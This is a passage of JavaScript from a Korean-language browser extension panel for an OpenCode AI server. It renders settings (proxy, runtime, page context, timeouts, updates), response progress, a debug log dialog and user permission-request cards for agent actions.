      (value ? `<span class="applied-value">${escapeHtml(value)}</span>` : `<span class="applied-value none">${t('없음')}</span>`) + '</div>';
    const empty = !env.http && !env.https && !env.noProxy;
    return `<div class="applied-title">${title} <span class="applied-badge ok">✓ ${t('서버에서 읽어 옴')}</span></div>
      ${empty
        ? `<div class="applied-reason">${t('적용된 프록시가 없습니다.')}</div>`
        : row('HTTP', env.http) + row('HTTPS', env.https) + row('NO_PROXY', env.noProxy)}
      ${fromRecord ? `<div class="applied-note">${t('확장이 서버를 시작할 때 전달한 값입니다.')}</div>` : ''}`;
  }

  function refreshAppliedProxyLine() {
    const el = document.getElementById('proxy-applied');
    if (!el) return;
    const html = appliedProxyHtml();
    el.innerHTML = html;
    el.classList.toggle('hidden', !html);
  }

  function invalidateAppliedProxy() {
    appliedProxyState = null;
    appliedProxyGen++;
  }

  async function loadAppliedProxy() {
    if (appliedProxyState !== null || !settingsServerPort) return;
    const gen = ++appliedProxyGen;
    appliedProxyState = 'loading';
    refreshAppliedProxyLine();
    let result = { env: null, source: null, reason: null };
    try {
      const res = await sendMessageToBackground('get-server-origin');
      result = { env: res.proxyEnv || null, source: res.proxyEnvSource || null, reason: res.proxyEnvReason || null };
    } catch {}
    if (gen !== appliedProxyGen) return; // 그 사이 무효화됨(패널을 다시 열었거나 재시작)
    appliedProxyState = result;
    refreshAppliedProxyLine();
  }

  async function renderSettingsDropdown() {
    let info;
    try {
      info = await sendMessageToBackground('get-runtime-info');
    } catch {
      info = { preferredRuntime: 'auto', serverIsWSL: null, port: null };
    }
    if (proxyCache === null) {
      proxyCache = { http: '', https: '', noProxy: '' };
      try {
        proxyCache = (await sendMessageToBackground('get-proxy')).proxy || proxyCache;
      } catch {}
    }
    // 재렌더(호스트 버전 확인 완료·언어 변경 등)로 저장하지 않은 입력이 지워지지 않게 현재 입력칸을 우선한다.
    const liveHttp = document.getElementById('proxy-http');
    if (liveHttp) {
      proxyDraft = {
        http: liveHttp.value,
        https: document.getElementById('proxy-https')?.value ?? '',
        noProxy: document.getElementById('proxy-no')?.value ?? ''
      };
    }
    const proxy = proxyDraft || proxyCache;
    let pageContextMode = 'basic';
    let pageAccessGranted = false;
    let responseTimeoutMin = 0;
    try {
      const stored = Number((await chrome.storage.local.get('responseTimeoutMin')).responseTimeoutMin);
      if (RESPONSE_TIMEOUT_CHOICES_MIN.includes(stored)) responseTimeoutMin = stored;
    } catch {}
    try {
      const { pageContext } = await chrome.storage.local.get('pageContext');
      if (['off', 'basic', 'full'].includes(pageContext)) pageContextMode = pageContext;
      pageAccessGranted = await chrome.permissions.contains({ origins: PAGE_ACCESS_ORIGINS });
    } catch {}
    settingsServerPort = info.port || null;
    const pref = info.preferredRuntime || 'auto';
    const currentRuntime = info.serverIsWSL === true ? 'wsl' : info.serverIsWSL === false ? 'windows' : null;
    const currentText = !info.port
      ? t('서버 연결 안 됨')
      : t('현재 실행 중: {runtime} · :{port}', { runtime: currentRuntime ? RUNTIME_LABELS[currentRuntime] : t('알 수 없음'), port: info.port });

    const option = (value, label) =>
      `<option value="${value}"${pref === value ? ' selected' : ''}>${label}</option>`;
    const dis = restartBusy ? ' disabled' : '';
    const proxySet = !!(proxy.http || proxy.https || proxy.noProxy);
    const currentVersion = chrome.runtime.getManifest().version;

    loadHostInfo();

    settingsDropdown.innerHTML = `
      <div class="settings-section">
        <label class="settings-row">
          <span class="settings-title">${t('언어 / Language')}</span>
          <select id="lang-select" class="settings-select">
            <option value="ko"${I18N.getLang() === 'ko' ? ' selected' : ''}>한국어</option>
            <option value="en"${I18N.getLang() === 'en' ? ' selected' : ''}>English</option>
          </select>
        </label>
      </div>
      <div class="settings-section">
        <label class="settings-row">
          <span class="settings-title">${t('페이지 컨텍스트')}</span>
          <select id="page-context-select" class="settings-select">
            <option value="off"${pageContextMode === 'off' ? ' selected' : ''}>${t('보내지 않음')}</option>
            <option value="basic"${pageContextMode === 'basic' ? ' selected' : ''}>${t('제목·URL')}</option>
            <option value="full"${pageContextMode === 'full' ? ' selected' : ''}>${t('제목·URL·본문·선택 텍스트')}</option>
          </select>
        </label>
        <div class="settings-current">${t('메시지를 보낼 때 현재 탭 정보를 함께 보냅니다. 이 정보는 OpenCode를 거쳐 설정한 AI 제공자에게 전달됩니다.')}</div>
        ${pageContextMode === 'full' && !pageAccessGranted
          ? `<div class="settings-current warn">${t('⚠ 페이지 읽기 권한이 없어 제목·URL만 보냅니다. 다시 선택하면 권한을 요청합니다.')}</div>`
          : ''}
      </div>
      <div class="settings-section">
        <label class="settings-row">
          <span class="settings-title">${t('응답 제한 시간')}</span>
          <select id="response-timeout-select" class="settings-select">
            ${RESPONSE_TIMEOUT_CHOICES_MIN.map((m) => `<option value="${m}"${responseTimeoutMin === m ? ' selected' : ''}>${m === 0 ? t('없음') : t('{min}분', { min: m })}</option>`).join('')}
          </select>
        </label>
        <div class="settings-current">${responseTimeoutMin === 0
          ? t('응답이 오래 걸려도 끊지 않습니다. 서버가 처리 중인지 주기적으로 확인하고, 멈추면 ■로 중단하세요.')
          : t('이 시간 동안 아무 진행이 없으면 응답을 중단합니다. 다음 메시지부터 적용됩니다.')}</div>
      </div>
      <div class="settings-section">
        <label class="settings-row">
          <span class="settings-title">${t('실행 환경')}</span>
          <select id="runtime-pref" class="settings-select"${dis}>
            ${option('auto', t('자동 (WSL 우선)'))}
            ${option('wsl', 'WSL')}
            ${option('windows', 'Windows')}
          </select>
        </label>
        <div class="settings-current">${escapeHtml(currentText)}</div>
      </div>
      <details id="proxy-details" class="settings-section settings-collapse"${proxyOpen ? ' open' : ''}>
        <summary class="settings-title">${t('프록시')} <span class="settings-muted">${proxySet ? t('(설정됨)') : t('(미설정)')}</span></summary>
        <label class="settings-field">HTTP
          <input id="proxy-http" type="text" spellcheck="false" autocomplete="off" placeholder="http://host:8080" value="${escapeHtml(proxy.http)}"${dis}>
        </label>
        <label class="settings-field">HTTPS
          <input id="proxy-https" type="text" spellcheck="false" autocomplete="off" placeholder="http://host:8080" value="${escapeHtml(proxy.https)}"${dis}>
        </label>
        <label class="settings-field">${t('제외 목록 (NO_PROXY)')}
          <input id="proxy-no" type="text" spellcheck="false" autocomplete="off" placeholder="localhost,127.0.0.1,*.internal" value="${escapeHtml(proxy.noProxy)}"${dis}>
        </label>
        <div id="proxy-applied" class="proxy-applied hidden"></div>
        <div class="settings-current" title="${escapeHtml(t('계정이 필요하면 http://user:pass@host:port (비밀번호의 @ : / # % 는 %40 등으로 인코딩). 비워 두면 시스템 환경변수를 사용합니다.'))}">${t('계정: http://user:pass@host:port · 비우면 시스템 환경변수 사용')}</div>
        <div class="settings-current warn">${t('⚠ 입력값은 브라우저에 평문으로 저장됩니다.')}</div>
        <div class="settings-buttons">
          <button id="proxy-reset-btn" class="mcp-action-btn"${dis}>${t('초기화')}</button>
          <button id="proxy-save-btn" class="mcp-action-btn"${dis}>${t('저장')}</button>
        </div>
      </details>
      <div class="mcp-actions">
        <button id="settings-hard-restart-btn" class="mcp-action-btn danger"${dis}
                title="${t('opencode 서버 프로세스를 종료하고 다시 시작합니다')}">${t('서버 강제 재시작')}</button>
        <div id="settings-action-status" class="mcp-action-status hidden"></div>
      </div>
      <div class="settings-section">
        <div class="settings-title">${t('정보')}</div>
        <div class="settings-row">
          <span>${t('확장 v{version}', { version: escapeHtml(currentVersion) })}</span>
          <button id="update-check-btn" class="mcp-action-btn"${updateCheckBusy ? ' disabled' : ''}>${updateCheckBusy ? t('확인 중…') : t('업데이트 확인')}</button>
        </div>
        <div class="settings-row"><span>Native Host</span><span class="settings-row-end">${hostVersionHtml()}</span></div>
        ${pendingUpdate ? `
        <div class="settings-update">
          <span>${t('⬆ 새 버전 v{version} 준비됨', { version: escapeHtml(pendingUpdate.version) })}</span>
          <button id="update-apply-btn" class="mcp-action-btn">${t('지금 적용')}</button>
        </div>` : ''}
        ${updateCheckText ? `<div class="settings-current">${escapeHtml(updateCheckText)}</div>` : ''}
      </div>`;
    applyMcpActionStatus();

    document.getElementById('lang-select')?.addEventListener('change', (e) => {
      I18N.setLang(e.target.value);
      onLanguageChanged();
    });

    document.getElementById('response-timeout-select')?.addEventListener('change', async (e) => {
      const value = Number(e.target.value);
      if (!RESPONSE_TIMEOUT_CHOICES_MIN.includes(value)) return;
      try { await chrome.storage.local.set({ responseTimeoutMin: value }); } catch {}
      renderSettingsDropdown();
    });

    document.getElementById('page-context-select')?.addEventListener('change', (e) => {
      const next = e.target.value;
      // permissions.request는 사용자 제스처 안에서 await 전에 호출해야 한다.
      const granted = next === 'full'
        ? chrome.permissions.request({ origins: PAGE_ACCESS_ORIGINS }).catch(() => false)
        : Promise.resolve(true);
      granted.then(async (ok) => {
        const value = next === 'full' && !ok ? 'basic' : next;
        try { await chrome.storage.local.set({ pageContext: value }); } catch {}
        if (next === 'full' && !ok) setMcpActionStatus(t('페이지 읽기 권한이 허용되지 않아 제목·URL만 보냅니다.'), 'error');
        renderSettingsDropdown();
      });
    });

    document.getElementById('proxy-details')?.addEventListener('toggle', (e) => { proxyOpen = e.target.open; });
    refreshAppliedProxyLine();
    // 패널을 그린 뒤 백그라운드로 조회를 시작한다(기다리지 않음). 사용자가 프록시 섹션을 펼칠 때
    // 아직 끝나지 않았으면 "확인 중…"이 보이고, 끝나면 그 줄만 갱신된다. 이미 조회했으면 무시된다.
    loadAppliedProxy();

    document.getElementById('host-update-btn')?.addEventListener('click', () => {
      hostGuideDismissed = false;
      settingsDropdown.classList.add('hidden');
      showNativeHostGuide(hostInfo?.state === 'missing' ? 'missing' : 'outdated', hostInfo?.hostVersion);
    });

    document.getElementById('update-check-btn')?.addEventListener('click', async () => {
      if (updateCheckBusy) return;
      updateCheckBusy = true;
      updateCheckText = '';
      renderSettingsDropdown();
      try {
        const res = await sendMessageToBackground('check-extension-update');
        if (!res.success) updateCheckText = t('확인 실패: {error}', { error: res.error });
        else if (res.status === 'update_available') updateCheckText = t('새 버전 v{version}을 받았습니다.', { version: res.version || '' });
        else if (res.status === 'throttled') updateCheckText = t('잠시 후 다시 시도해 주세요.');
        else updateCheckText = t('최신 버전입니다.');
      } catch (e) {
        updateCheckText = t('확인 실패: {error}', { error: e.message });
      }
      updateCheckBusy = false;
      renderSettingsDropdown();
    });

    document.getElementById('update-apply-btn')?.addEventListener('click', async () => {
      const ok = await showConfirm(
        t('업데이트 적용'),
        t('확장이 v{version}으로 다시 로드됩니다.\n진행 중인 응답은 중단됩니다.', { version: pendingUpdate.version }),
        { okText: t('지금 적용'), cancelText: t('나중에') }
      );
      if (!ok) return;
      try { await sendMessageToBackground('cancel-message', { sessionId: currentSessionId }); } catch {}
      try { await sendMessageToBackground('apply-extension-update'); } catch {}
    });

    document.getElementById('runtime-pref')?.addEventListener('change', async (ev) => {
      const input = ev.target;
      {
        const next = input.value;
        // 연결된 서버가 있고, 명시적으로 고른 환경이 현재와 다를 때만 재시작이 필요하다.
        // (환경을 알 수 없는 경우도 다른 것으로 본다.)
        const needsRestart = !!info.port && next !== 'auto' && next !== currentRuntime;
        if (!needsRestart) {
          try {
            await sendMessageToBackground('set-runtime-preference', { preferredRuntime: next });
            setMcpActionStatus(t('저장했습니다 (다음 시작부터 적용)'), 'ok');
          } catch (e) {
            setMcpActionStatus(t('실패: {error}', { error: t(e.message) }), 'error');
          }
          renderSettingsDropdown();
          return;
        }

        const change = currentRuntime
          ? t('{from} → {to}(으)로 변경합니다.', { from: RUNTIME_LABELS[currentRuntime], to: RUNTIME_LABELS[next] })
          : t('{to} 환경으로 변경합니다.', { to: RUNTIME_LABELS[next] });
        const ok = await showConfirm(
          t('실행 환경 변경'),
          t('{change}\nOpenCode가 재시작됩니다.\n진행 중인 응답은 중단됩니다.', { change })
        );
        if (!ok) {
          renderSettingsDropdown(); // 선택을 이전 값으로 되돌린다
          return;
        }
        runServerRestart('hard', next);
      }
    });

    const readProxyInputs = () => ({
      http: document.getElementById('proxy-http').value.trim(),
      https: document.getElementById('proxy-https').value.trim(),
      noProxy: document.getElementById('proxy-no').value.trim()
    });
    document.getElementById('proxy-save-btn')?.addEventListener('click', () => saveProxy(readProxyInputs()));
    document.getElementById('proxy-reset-btn')?.addEventListener('click', () => saveProxy({ http: '', https: '', noProxy: '' }));

    document.getElementById('settings-hard-restart-btn')?.addEventListener('click', async () => {
      if (restartBusy) return;
      const ok = await showConfirm(
        t('서버 강제 재시작'),
        t('OpenCode가 재시작됩니다.\n진행 중인 응답은 중단되며 10~30초 걸릴 수 있습니다.')
      );
      if (ok) runServerRestart('hard');
    });
  }

  // 프록시는 서버 프로세스의 환경변수라 저장만으로는 반영되지 않고, 확장이 띄운 서버를
  // 하드 재시작해야 적용된다. 서버 상태에 따라 안내를 달리한다.
  async function saveProxy(values) {
    if (restartBusy) return;
    try {
      await sendMessageToBackground('set-proxy', { proxy: values });
      proxyCache = values;
      proxyDraft = null;
      invalidateAppliedProxy();
    } catch (e) {
      setMcpActionStatus(t('실패: {error}', { error: t(e.message) }), 'error');
      renderSettingsDropdown();
      return;
    }

    let origin = { connected: false };
    try { origin = await sendMessageToBackground('get-server-origin'); } catch {}

    const savedLater = t('저장했습니다 (서버를 다시 시작하면 적용)');
    if (!origin.connected) {
      setMcpActionStatus(t('저장했습니다 (서버 시작 시 적용)'), 'ok');
      renderSettingsDropdown();
      return;
    }

    // 이 확장이 응답을 받는 중이면 busy에 그 세션 1개가 포함된다.
    const otherBusy = Math.max(0, (origin.busy || 0) - (isLoading ? 1 : 0));
    const busyWarn = otherBusy > 0
      ? t('\n\n⚠ 이 서버에서 응답 중인 다른 세션이 {count}개 있습니다 (TUI 등 다른 클라이언트). 재시작하면 중단됩니다.', { count: otherBusy })
      : '';

    let restart;
    if (origin.managed === true) {
      restart = await showConfirm(
        t('프록시 적용'),
        t('프록시를 적용하려면 OpenCode 서버를 재시작해야 합니다.\n10~30초 걸리며 진행 중인 응답은 중단됩니다.{busyWarn}', { busyWarn }),
        { okText: t('지금 재시작'), cancelText: t('나중에') }
      );
    } else {
      const why = origin.managed === false
        ? t('현재 연결된 서버는 이 확장이 시작한 것이 아니라서(터미널·VS Code 등에서 실행했거나 이전 버전이 시작) 프록시가 적용되지 않을 수 있습니다.')
        : t('현재 서버를 이 확장이 시작했는지 확인할 수 없습니다.');
      restart = await showConfirm(
        t('프록시 적용'),
        t('설정은 저장되었고, 이 확장이 서버를 새로 시작할 때 적용됩니다.\n{why}\n\n그래도 지금 서버를 종료하고 재시작할까요?{busyWarn}', { why, busyWarn }),
        { okText: t('그래도 재시작'), cancelText: t('저장만') }
      );
    }

    if (restart) {
      runServerRestart('hard');
    } else {
      setMcpActionStatus(savedLater, 'ok');
      renderSettingsDropdown();
    }
  }

  settingsBtn.addEventListener('click', (e) => {
    e.stopPropagation();
    if (settingsDropdown.classList.contains('hidden')) {
      mcpDropdown.classList.add('hidden');
      if (!restartBusy) mcpActionStatus = null;
      settingsDropdown.classList.remove('hidden');
      // 저장된 값을 읽는 동안에는 입력칸을 보여주지 않아(=입력 불가) 입력이 덮어써지는 일을 막는다.
      proxyCache = null;
      proxyDraft = null;
      invalidateAppliedProxy();
      settingsDropdown.innerHTML = `<div class="settings-section"><span class="settings-muted">${t('확인 중…')}</span></div>`;
      renderSettingsDropdown();
    } else {
      settingsDropdown.classList.add('hidden');
    }
  });

  mcpBtn.addEventListener('click', (e) => {
    e.stopPropagation();
    if (mcpDropdown.classList.contains('hidden')) {
      settingsDropdown.classList.add('hidden');
      if (!restartBusy) mcpActionStatus = null; // 지난 재시작 결과 문구는 열 때 지운다
      renderMcpDropdown();
      mcpDropdown.classList.remove('hidden');
    } else {
      mcpDropdown.classList.add('hidden');
    }
  });

  document.addEventListener('click', (e) => {
    if (!mcpDropdown.classList.contains('hidden') &&
        !mcpBtn.contains(e.target) && !mcpDropdown.contains(e.target)) {
      mcpDropdown.classList.add('hidden');
    }
    if (!settingsDropdown.classList.contains('hidden') &&
        !settingsBtn.contains(e.target) && !settingsDropdown.contains(e.target)) {
      settingsDropdown.classList.add('hidden');
    }
  });

  function scrollToBottom() {
    messagesContainer.scrollTop = messagesContainer.scrollHeight;
  }

  function renderMarkdown(raw) {
    const text = raw || '';
    if (typeof marked === 'undefined' || typeof DOMPurify === 'undefined') return escapeHtml(text).replace(/\n/g, '<br>');
    const frag = DOMPurify.sanitize(marked.parse(text), { ...MD_SANITIZE_CONFIG, RETURN_DOM_FRAGMENT: true });
    for (const img of frag.querySelectorAll('img')) {
      const src = img.getAttribute('src') || '';
      if (/^data:image\//i.test(src)) continue;
      const a = document.createElement('a');
      a.className = 'md-img-link';
      a.textContent = img.getAttribute('alt') || src;
      if (/^https?:/i.test(src)) {
        a.href = src;
        a.target = '_blank';
        a.rel = 'noopener noreferrer';
        a.title = src;
      }
      img.replaceWith(a);
    }
    const box = document.createElement('div');
    box.appendChild(frag);
    return box.innerHTML;
  }

  function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }

  function sendMessageToBackground(action, data = {}) {
    return new Promise((resolve, reject) => {
      chrome.runtime.sendMessage({ action, ...data }, (response) => {
        if (chrome.runtime.lastError) {
          reject(new Error(chrome.runtime.lastError.message));
        } else if (response && response.error) {
          reject(new Error(response.error));
        } else {
          resolve(response || {});
        }
      });
    });
  }

  messageInput.addEventListener('input', () => {
    messageInput.style.height = 'auto';
    messageInput.style.height = Math.min(messageInput.scrollHeight, 120) + 'px';
    updateSendButtonState();

    const val = messageInput.value;
    if (val.startsWith('/') && !val.includes(' ')) {
      showCommandDropdown(val);
    } else {
      hideCommandDropdown();
    }
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Tab' && e.shiftKey) {
      e.preventDefault();
      cycleAgent();
    }
  });

  messageInput.addEventListener('keydown', (e) => {
    if (isDropdownOpen) {
      const items = commandDropdown.querySelectorAll('.command-item');
      if (e.key === 'ArrowDown') {
        e.preventDefault();
        highlightDropdownItem(Math.min(selectedDropdownIndex + 1, items.length - 1));
        return;
      }
      if (e.key === 'ArrowUp') {
        e.preventDefault();
        highlightDropdownItem(Math.max(selectedDropdownIndex - 1, 0));
        return;
      }
      if (e.key === 'Enter') {
        e.preventDefault();
        if (selectedDropdownIndex >= 0 && items[selectedDropdownIndex]) {
          selectCommand(items[selectedDropdownIndex]);
        }
        return;
      }
      if (e.key === 'Escape') {
        e.preventDefault();
        hideCommandDropdown();
        return;
      }
      if (e.key === 'Tab' && !e.shiftKey) {
        e.preventDefault();
        const target = items[selectedDropdownIndex] || items[0];
        if (target) selectCommand(target);
        return;
      }
    }
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      sendMessage();
    }
  });

  messageInput.addEventListener('blur', () => {
    setTimeout(hideCommandDropdown, 150);
  });

  function setLoadingState(loading) {
    isLoading = loading;
    if (loading) {
      sendBtn.disabled = false;
      sendBtn.innerHTML = STOP_ICON_SVG;
      sendBtn.setAttribute('aria-label', t('중단'));
      sendBtn.classList.add('cancel-mode');
      loadingIndicator.classList.remove('hidden');
      messageInput.placeholder = t('응답 중 — 입력하면 대기 메시지로 보냅니다');
      startProgress();
    } else {
      sendBtn.innerHTML = SEND_ICON_SVG;
      sendBtn.setAttribute('aria-label', t('보내기'));
      sendBtn.classList.remove('cancel-mode');
      updateSendButtonState();
      loadingIndicator.classList.add('hidden');
      messageInput.placeholder = t('메시지를 입력하세요...');
      clearRetryStatus();
      stopProgress();
    }
  }

  // 응답 진행 표시. 응답 제한 시간이 기본 "없음"이라 느린 모델은 수 분간 아무 이벤트가 없을 수 있다.
  // 멈춘 건지 일하는 중인지 알 수 있게 현재 단계 · 경과 시간 · (조용하면) 마지막 활동과 서버 확인 결과를 1초마다 그린다.
  const QUIET_HINT_MS = 30000;
  const progress = { startedAt: 0, lastActivityAt: 0, phase: 'waiting', detail: '', server: null, serverAt: 0 };
  let progressTicker = null;

  function formatDuration(ms) {
    const total = Math.max(0, Math.floor(ms / 1000));
    const h = Math.floor(total / 3600);
    const m = Math.floor((total % 3600) / 60);
    const sec = String(total % 60).padStart(2, '0');
    return h ? `${h}:${String(m).padStart(2, '0')}:${sec}` : `${m}:${sec}`;
  }

  function startProgress() {
    const now = Date.now();
    Object.assign(progress, { startedAt: now, lastActivityAt: now, phase: 'waiting', detail: '', server: null, serverAt: 0 });
    clearInterval(progressTicker);
    progressTicker = setInterval(renderProgress, 1000);
    renderProgress();
  }

  function stopProgress() {
    clearInterval(progressTicker);
    progressTicker = null;
    loadingText.textContent = t('응답 대기 중...');
    loadingIndicator.classList.remove('stalled');
  }

  // 응답 이벤트가 올 때마다 단계를 갱신한다. phase가 null이면 단계는 그대로 두고 활동 시각만 갱신한다.
  function noteProgress(phase, detail = '', { newTurn = false } = {}) {
    if (!isLoading) return;
    const now = Date.now();
    progress.lastActivityAt = now;
    if (newTurn) progress.startedAt = now;
    if (phase) { progress.phase = phase; progress.detail = detail; }
    renderProgress();
  }

  function noteServerCheck(state) {
    if (!isLoading) return;
    progress.server = state;
    progress.serverAt = Date.now();
    renderProgress();
  }

  function phaseLabel() {
    switch (progress.phase) {
      case 'thinking': return t('생각 중');
      case 'writing': return t('응답 작성 중');
      case 'tool': return t('도구 실행 중: {tool}', { tool: progress.detail });
      case 'subagent': return t('하위 에이전트 작업 중: {agent}', { agent: progress.detail });
      case 'asking': return t('사용자 응답 대기 중');
      default: return t('모델 응답 대기 중');
    }
  }

  function renderProgress() {
    if (!isLoading || !progressTicker || loadingIndicator.classList.contains('retrying')) return;
    const now = Date.now();
    const segs = [phaseLabel(), formatDuration(now - progress.startedAt)];
    const quietMs = now - progress.lastActivityAt;
    let stalled = false;
    if (quietMs >= QUIET_HINT_MS && progress.phase !== 'asking') {
      segs.push(t('마지막 활동 {ago} 전', { ago: formatDuration(quietMs) }));
      // 서버 확인 결과는 마지막 활동 이후의 것만 의미가 있다
      if (progress.serverAt > progress.lastActivityAt) {
        if (progress.server === 'busy') segs.push(t('서버 처리 중 확인됨'));
        else if (progress.server === 'unreachable') { segs.push(t('서버 응답 없음 — 다시 확인 중')); stalled = true; }
      }
    }
    const queued = pendingQueue.length;
    if (queued) segs.push(t('대기 메시지 {count}개', { count: queued }));
    loadingText.textContent = segs.join(' · ');
    loadingIndicator.classList.toggle('stalled', stalled);
  }

  // 제공자 재시도(레이트 리밋·과부하) 대기 표시. background가 session.status retry를 kind:'retry'로 넘긴다.
  // 대기 중에는 서버 이벤트가 없어 멈춘 것처럼 보이므로, 몇 번째 시도인지와 다음 시도까지 남은 시간을 보여 준다.
  let retryTicker = null;
  function showRetryStatus(part) {
    clearInterval(retryTicker);
    const render = () => {
      const secs = part.next ? Math.ceil((part.next - Date.now()) / 1000) : 0;
      const params = { attempt: part.attempt ?? '?', secs };
      loadingText.textContent = secs > 0
        ? t('재시도 대기 ({attempt}회차) · {secs}초 후', params)
        : t('재시도 중 ({attempt}회차)...', params);
      if (secs <= 0) { clearInterval(retryTicker); retryTicker = null; }
    };
    render();
    if (part.next && part.next > Date.now()) retryTicker = setInterval(render, 1000);
    // 제공자 오류 문구(예: "Rate limited")는 길 수 있어 툴팁으로 둔다
    loadingIndicator.title = part.message || '';
    loadingIndicator.classList.add('retrying');
  }

  function clearRetryStatus() {
    clearInterval(retryTicker);
    retryTicker = null;
    if (!loadingIndicator.classList.contains('retrying')) return;
    loadingIndicator.classList.remove('retrying');
    loadingIndicator.title = '';
    loadingText.textContent = t('응답 대기 중...');
    renderProgress();
  }

  async function cancelMessage() {
    if (!isLoading || !currentSessionId) return;
    await sendMessageToBackground('cancel-message', { sessionId: currentSessionId });
    if (activeBlocks) {
      finalizeRunning(activeBlocks, 'cancelled');
      renderBlocks(activeBlocks, activeBlocksContainer);
      activeBlocks = null;
      activeBlocksContainer = null;
    }
    removeTypingIndicator();
    settleQueue({ cancelled: true });
    setLoadingState(false);
  }

  // ============================================
  // 디버그 로그 (/ext-log 커맨드)
  // ============================================

  const debugDialog = document.getElementById('debug-dialog');
  const debugContent = document.getElementById('debug-content');
  const debugCopyStatus = document.getElementById('debug-copy-status');
  const debugCopyBtn = document.getElementById('debug-copy-btn');
  const debugCloseBtn = document.getElementById('debug-close-btn');

  debugCloseBtn.addEventListener('click', () => debugDialog.classList.add('hidden'));

  debugCopyBtn.addEventListener('click', async () => {
    try {
      await navigator.clipboard.writeText(debugContent.textContent);
      debugCopyStatus.textContent = t('✓ 복사됨');
      setTimeout(() => { debugCopyStatus.textContent = ''; }, 2000);
    } catch {
      debugCopyStatus.textContent = t('수동으로 복사하세요');
    }
  });

  async function showDebugLog() {
    const loadingDiv = document.createElement('div');
    loadingDiv.className = 'message bot-message';
    loadingDiv.innerHTML = `<div class="message-avatar">🔍</div><div class="message-content">${t('디버그 로그 수집 중...')}</div>`;
    messagesContainer.appendChild(loadingDiv);
    scrollToBottom();

    let result;
    try {
      result = await sendMessageToBackground('get-debug-logs');
    } catch (e) {
      loadingDiv.remove();
      addErrorMessage(t('디버그 로그 수집 실패: {error}', { error: e.message }));
      return;
    }
    loadingDiv.remove();

    const lines = [];
    lines.push('========== OpenCode Debug Log ==========');
    lines.push(`Generated : ${new Date().toISOString()}`);
    lines.push('=========================================');
    lines.push('');
    lines.push(`--- Service Worker Logs (${(result.swLogs || []).length}건) ---`);
    if (!result.swLogs || result.swLogs.length === 0) {
      lines.push('(SW 로그 없음)');
    } else {
      result.swLogs.forEach(e => lines.push(`${e.ts} [${(e.level || '').padEnd(5)}] ${e.msg}`));
    }
    lines.push('');
    lines.push('--- Native Host File Log ---');
    if (result.fileLog?.content) {
      if (result.fileLog.path) lines.push(`Path: ${result.fileLog.path}`);
      lines.push(result.fileLog.content);
    } else {
      lines.push('⚠ 파일 로그 없음 (Native Messaging 연결 실패 또는 로그 파일 미생성)');
      lines.push('  위 SW 로그의 Chrome 에러 메시지로 원인을 확인하세요.');
    }

    const fullText = lines.join('\n');
    debugContent.textContent = fullText;
    debugCopyStatus.textContent = '';
    debugDialog.classList.remove('hidden');

    try {
      await navigator.clipboard.writeText(fullText);
      debugCopyStatus.textContent = t('✓ 클립보드에 자동 복사됨');
    } catch {
      debugCopyStatus.textContent = t('복사 버튼을 눌러 수동으로 복사하세요');
    }
  }

  // ============================================
  // 도구 호출 / reasoning 진행 표시 (블록 렌더링)
  // block-state.js(전역 함수: createBlocks, appendTextDelta, upsertToolPart,
  // upsertReasoningStart, appendReasoningDelta, finalizeRunning)를 사용한다.
  // ============================================

  let activeBlocks = null;
  let activeBlocksContainer = null;

  // SSE delta는 화면 주사율보다 훨씬 빠르게 도착할 수 있어, state(activeBlocks) 갱신은
  // 매번 즉시 하되 실제 DOM 렌더(renderBlocks, 마크다운 재파싱 포함)는 프레임당 최대
  // 1회로 코얼레싱한다 (copy_markdown_enhancement_plan.md §4, O(n^2) 재파싱 방지).
  const blockRenderScheduler = createRenderScheduler({
    render: () => {
      if (activeBlocks && activeBlocksContainer) {
        renderBlocks(activeBlocks, activeBlocksContainer);
        scrollToBottom();
      }
    },
    requestFrame: (cb) => requestAnimationFrame(cb),
    cancelFrame: (id) => cancelAnimationFrame(id),
  });

  // ============================================
  // 권한/질문 요청 카드 (opencode permission.asked / question.asked)
  // 응답하지 않으면 서버가 계속 대기하므로 반드시 사용자에게 보여야 한다.
  // 서버가 준 문자열은 모두 textContent로만 넣는다.
  // ============================================
  const interactionCards = new Map(); // requestId -> { el, resolved }

  function handleInteractionPart(part) {
    if (part.kind === 'interaction-resolved') {
      markInteractionResolved(part.id, part.reply);
      return;
    }
    const existing = interactionCards.get(part.id);
    // 탭 전환·히스토리 재렌더로 messagesContainer가 비워지면 카드 DOM이 떨어져 나간다 → 다시 그린다.
    if (existing && document.body.contains(existing.el)) return;
    const card = part.kind === 'permission' ? buildPermissionCard(part) : buildQuestionCard(part);
    interactionCards.set(part.id, { el: card, resolved: false });
    messagesContainer.appendChild(card);
    scrollToBottom();
  }

  function interactionCardShell(title, subtitle) {
    const el = document.createElement('div');
    el.className = 'interaction-card';
    const head = document.createElement('div');
    head.className = 'interaction-title';
    head.textContent = title;
    el.appendChild(head);
    if (subtitle) {
      const sub = document.createElement('div');
      sub.className = 'interaction-sub';
      sub.textContent = subtitle;
      el.appendChild(sub);
    }
    const status = document.createElement('div');
    status.className = 'interaction-status hidden';
    el._status = status;
    return el;
  }

  function setInteractionStatus(el, text, kind) {
    el._status.textContent = text;
    el._status.className = `interaction-status ${kind || ''}`;
  }

  function disableInteraction(el) {
    el.querySelectorAll('button, input').forEach((b) => { b.disabled = true; });
  }

  async function sendInteraction(el, action, data) {
    disableInteraction(el);
    setInteractionStatus(el, t('전송 중…'));
    try {
      await sendMessageToBackground(action, { sessionId: currentSessionId, ...data });
      setInteractionStatus(el, t('응답을 보냈습니다.'), 'ok');
    } catch (e) {
      setInteractionStatus(el, t('실패: {error}', { error: t(e.message) }), 'error');
      el.querySelectorAll('button, input').forEach((b) => { b.disabled = false; });
    }
  }

  function buildPermissionCard(part) {
    const el = interactionCardShell(
      t('권한 요청: {permission}', { permission: part.permission || '?' }),
      part.fromSubagent ? t('하위 에이전트의 요청입니다.') : ''
    );
    if (part.patterns?.length) {
      const pre = document.createElement('pre');
      pre.className = 'interaction-detail';
      pre.textContent = part.patterns.join('\n');
      el.appendChild(pre);
    }
    const buttons = document.createElement('div');
    buttons.className = 'interaction-buttons';
    const mk = (label, reply, cls, title) => {
      const b = document.createElement('button');
      b.className = `mcp-action-btn ${cls || ''}`;
      b.textContent = label;
      if (title) b.title = title;
      b.addEventListener('click', () => sendInteraction(el, 'reply-permission', {
        requestId: part.id, requestSessionId: part.sessionID, reply
      }));
      buttons.appendChild(b);
    };
    mk(t('한 번 허용'), 'once', 'primary');
